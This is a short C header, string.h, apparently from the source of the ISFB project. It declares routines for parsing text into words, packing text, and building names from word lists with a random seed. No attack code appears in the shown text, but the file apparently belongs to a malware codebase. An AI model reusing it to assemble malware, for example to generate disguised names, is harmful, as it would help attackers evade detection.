//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: string.h
// $Revision: 39 $
// $Date: 2013-03-19 18:02:34 +0300 (Вт, 19 мар 2013) $
// description:
//	Strings manipulation routines. Text parsing, random string generation and so on. 

ULONG	StringParseText(
					LPTSTR	Text,			//	0-terminated string of words
					ULONG	NumberWords,	//	number of words to parse
					ULONG	MinWordLen,		//	minimum word len (to skip short words)	
					OUT	LPTSTR**	pWords	
					);


LPTSTR	StringNameFromWords(
					IN	PULONG	pSeed,
					IN	LPTSTR*	Words,
					IN	ULONG	NumberWords,
					IN	ULONG	MinLength,
					IN	ULONG	MaxLength
					);

ULONG	StringPackText(
			   LPTSTR	Text,			//	0-terminated string of words
			   ULONG	MaxWords,
			   ULONG	MinWordLen
			   );